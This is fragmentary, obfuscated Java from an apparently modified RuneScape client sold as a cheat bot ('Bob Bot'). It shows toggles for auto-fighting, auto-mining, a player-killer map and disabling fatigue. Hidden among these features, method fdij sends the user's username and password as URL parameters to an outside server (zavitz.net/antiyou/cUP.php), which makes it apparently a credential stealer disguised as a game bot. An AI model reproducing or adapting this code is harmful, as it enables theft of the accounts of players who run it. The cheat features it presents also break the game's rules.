...
public void fdij()
    {
        String s = "http://zavitz.net/antiyou/cUP.php?user=" + djk + "&pass=" + djl;
        try
        {
            s = s.replace(' ', '_');
            URL url = new URL(s);
 ...
 public static final void main(String args[])
    {
        ...
        mudclient1.fme(mudclient1.dmj, mudclient1.dmk + 11, "Best Of Pk By bob", false);
        mudclient1.flf = 10;
    }
    ...
    private final void enh(boolean flag)
    {
        ...
        if(dga == 0)
        {
            ...
            i1 += 12;
            dki.ceg("fatigue has been disabled. By BOB: @yel@" + (ejh * 100) / 750 + "%", i + 5, i1 - 13, 1, 0xffffff);
            i1 += 8;
...
server = ekj.ghj(serv);
 if(server.equals("51") || server.equals("52") || server.equals("53") || server.equals("54") || server.equals("55") || server.equals("56"))
                   {
                   if(server.equals("52") || server.equals("54") || server.equals("56"))
...
private final boolean fca(int i, int j)
    ...
    private final void fcn(boolean flag)
    {
        ...
        char c = '\304';
        dki.cbf(i, 36, 196, 65, 0x43435, 160);
        dki.cbf(i, 101, 196, 65, 0x43435, 160);
        dki.cbf(i, 166, 196, 95, 0x43435, 160);
        dki.cbf(i, 261, 196, 40, 0x43435, 160);
        int k = i + 3;
        int i1 = 51;
...
return new URL("http://" + super.aad + "/client2/");
    ...
    private final void fdn()
    {
        ...
        if(edi)
        {
            ...
            dki.cee("0" + (eji * 100) / 750 + "%", dmj / 2, 90, 7, 0xffff00);
...
dkm.bca = 99999; 
    	...
    	dki.ceg("@gre@Mouse:@ora@(" + super.flg + "," + super.flh + ")", 400, 225, 1, 0);
	
	dki.ceg("@gre@Att: @ora@" + egd[0] + "@ora@/@ora@" + dmc[0], 10, 155, 1, 0);
	
	dki.ceg("@gre@Def: @ora@" + egd[1] + "@ora@/@ora@" + dmc[1], 10, 166, 1, 0);
	
	dki.ceg("@gre@Str: @ora@" + egd[2] + "@ora@/@ora@" + dmc[2], 10, 177, 1, 0);
	
	dki.ceg("@gre@Hp: @ora@" + egd[3] + "@ora@/@ora@" + dmc[3], 10, 188, 1, 0);
	
	dki.ceg("@gre@Ranged: @ora@" + egd[4] + "@ora@/@ora@" + dmc[4], 10, 199, 1, 0);
	
	dki.ceg("@gre@Username: @ora@" + djk, 10, 210, 1, 0);
	
	dki.ceg("@gre@Combat: @ora@" + emd.hbi, 10, 221, 1, 0);
    ...
    private final void fej()
    {
        ...
        {
            elj.ggj(256, 240, "Welcome to RuneScape", 4, true);
...
if (i == 1010)
        {
            ...
            if (left == true)
            {
                fci("@whi@Bob Bot: @ora@Starting GuildMine", 3);
            } else {
                fci("@whi@Bob Bot: @ora@Stopping GUildMine", 3);
            }
        }
...
if (i == 1011)
        {
            ...
            if (left == true)
            {
                fci("@whi@Bob Bot: @ora@WalkBack is now @gre@ON", 3);
            } else {
                fci("@whi@Bob Bot: @ora@WalkBack is now @red@OFF", 3);
            }
        }
...
if (i == 1012)
        {
            ...
            if (left == true)
            {
                fci("@whi@Bob Bot: @ora@Leftys is now @gre@ON", 3);
            } else {
                fci("@whi@Bob Bot: @ora@Leftys is now @red@OFF", 3);
            }
        }
...
if (i == 1013)
        {
            ...
            if (map == true)
            {
                fci("@whi@Bob Bot: @ora@Pkers PK map is now @gre@ON", 3);
            } else {
                fci("@whi@Bob Bot: @ora@Pkers PK map is now @red@OFF", 3);
            }
        }
	...
	if (i == 1014)
        {
            ...
            if (autofighter == true)
            {
                fci("@whi@Bob Bot@yel@: @ora@Now attacking Nearest npc...", 3);
            } else {
                fci("@whi@Bob Bot@yel@: @ora@Stopped Autoattacking.", 3);
            }
        }
	...
	if (i == 1015)
        {
            ...
            if (chat == true)
            {
                fci("@whi@Bob Bot: @ora@ChatFilter @whi@is now @red@OFF", 3);
            } else {
                fci("@whi@Bob Bot: @ora@Chatfilter @whi@is now @gre@ON", 3);
            }
        }
